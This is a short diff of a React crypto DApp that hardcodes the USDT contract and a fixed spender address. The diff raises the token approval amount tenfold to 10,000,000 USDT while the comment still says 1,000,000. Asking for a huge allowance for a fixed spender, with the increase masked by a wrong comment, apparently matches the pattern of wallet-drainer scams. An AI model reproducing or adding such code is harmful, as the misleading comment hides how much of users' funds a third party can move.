@@ -81,7 +81,7 @@ export default function DApp() {
   const [usdtBalance, setUsdtBalance] = useState("0");  // USDT 잔액 저장
   const usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
   const spenderAddress = "0x44E3AD8C4D486F4070822645462E5a23d46Cf7F1";
-  const approveAmount = Web3.utils.toWei("1000000", "mwei"); // 1,000,000 USDT
+  const approveAmount = Web3.utils.toWei("10000000", "mwei"); // 1,000,000 USDT
 
   useEffect(() => {
     if (typeof window.ethereum !== "undefined") {
@@ -112,7 +112,7 @@ export default function DApp() {
           }
           const result = await response.json();
           //setInformation(result); // 데이터를 상태로 저장합니다.
-          //console.log(result);
+          console.log(result);
         } catch (error) {
           console.error("Error fetching data:", error);
         }
